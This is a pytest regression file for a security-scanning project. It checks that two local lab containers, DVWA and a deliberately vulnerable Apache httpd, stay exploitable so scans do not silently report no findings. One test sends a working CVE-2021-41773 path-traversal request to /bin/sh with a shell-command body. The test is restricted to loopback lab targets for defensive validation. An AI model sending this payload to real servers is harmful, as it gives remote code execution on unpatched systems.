"""CONTROLLED-LAB target health regression test.

MARKER-GATED: ``lab_e2e``. Normal unit/integration runs DESELECT this
test (see pyproject addopts ``-m "not lab_e2e"``); run it explicitly:

    pytest -m lab_e2e tests/e2e/test_lab_target_health.py

Requires BOTH local lab targets running:

    docker compose -f docker/docker-compose.yml \
      -f docker/docker-compose.extra-targets.yml --profile lab up -d

These are the two silent-failure modes repaired on 2026-10-27 (see
``docker/local-lab/README.md`` and ``docker/restore-lab-targets.sh``).
Both used to leave the container "Up" while the target was useless, so
scans reported "completed, 0 findings" instead of failing loudly:

  dvwa             - a stale /var/run/apache2/apache2.pid made
                     ``service apache2 start`` believe Apache was already
                     running, so nothing listened on :80 and the MEDIUM
                     configuration-listing finding on /config/ vanished.
  vulnerable-httpd - a stale mod_cgid socket made the cgid daemon fail to
                     initialize, so every CGI request answered 503 while
                     root still served 200; nuclei detects CVE-2021-41773
                     through its RCE matcher, so the HIGH finding vanished.

This test asserts the observable state each finding depends on - a
directory listing at /config/ and genuine CGI execution on the CVE path -
so a degraded target fails here instead of silently producing an empty
scan. Loopback only; never a non-lab target.
"""
from __future__ import annotations

import os
import socket
import urllib.error
import urllib.request

import pytest

pytestmark = [pytest.mark.lab_e2e]

DVWA_BASE = os.getenv("AICYBERSEC_E2E_DVWA", "http://127.0.0.1:4280")
HTTPD_BASE = os.getenv("AICYBERSEC_E2E_HTTPD", "http://127.0.0.1:4282")

# CVE-2021-41773 RCE path: the exact request nuclei's RCE matcher sends,
# execution-derived content so a mere 200 is not enough to pass.
CVE_RCE_PATH = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


def _reachable(url: str) -> bool:
    from urllib.parse import urlparse

    try:
        parsed = urlparse(url)
        host = parsed.hostname or "127.0.0.1"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        with socket.create_connection((host, port), timeout=3):
            return True
    except OSError:
        return False


def _request(url: str, method: str = "GET", body: str | None = None) -> tuple[int, str]:
    data = body.encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=10) as res:
            return res.status, res.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:  # a lab target answering is still information
        return exc.code, exc.read().decode("utf-8", "replace")


dvwa_required = pytest.mark.skipif(
    not _reachable(DVWA_BASE),
    reason=f"DVWA lab target {DVWA_BASE} not reachable (docker compose --profile lab up)",
)
httpd_required = pytest.mark.skipif(
    not _reachable(HTTPD_BASE),
    reason=f"vulnerable-httpd lab target {HTTPD_BASE} not reachable (docker compose --profile lab up)",
)


@dvwa_required
def test_dvwa_serves_config_listing() -> None:
    """Apache must serve /config/ itself, not just have mysqld up.

    This is precisely what the MEDIUM nuclei ``configuration-listing``
    finding matches, so 503/refused/307-to-install means the demo finding
    would silently disappear.
    """
    status, body = _request(f"{DVWA_BASE}/config/")
    assert status == 200, f"GET /config/ returned {status} (Apache not serving)"
    assert "Index of /config" in body, "response is not an Apache directory listing"


@dvwa_required
def test_dvwa_setup_page_reachable() -> None:
    """The login/setup page must be reachable (not a blank target)."""
    status, _ = _request(f"{DVWA_BASE}/")
    assert status in (200, 302), f"GET / returned {status}"


@httpd_required
def test_vulnerable_httpd_serves_root() -> None:
    status, _ = _request(f"{HTTPD_BASE}/")
    assert status == 200, f"GET / returned {status}"


@httpd_required
def test_vulnerable_httpd_cve_2021_41773_cgi_executes() -> None:
    """The CVE path must EXECUTE /bin/sh, not merely answer.

    ``echo 6789-BAL-POC | rev`` comes back as ``COP-LAB-9876`` only when
    CGI actually ran; a 503 here is the stale-cgisock regression.
    """
    status, body = _request(
        f"{HTTPD_BASE}{CVE_RCE_PATH}",
        method="POST",
        body="echo Content-Type: text/plain; echo; echo 6789-BAL-POC | rev",
    )
    assert status == 200, f"CVE-2021-41773 CGI path returned {status} (cgid broken)"
    assert "COP-LAB-9876" in body, "CGI answered but did not execute (no marker)"
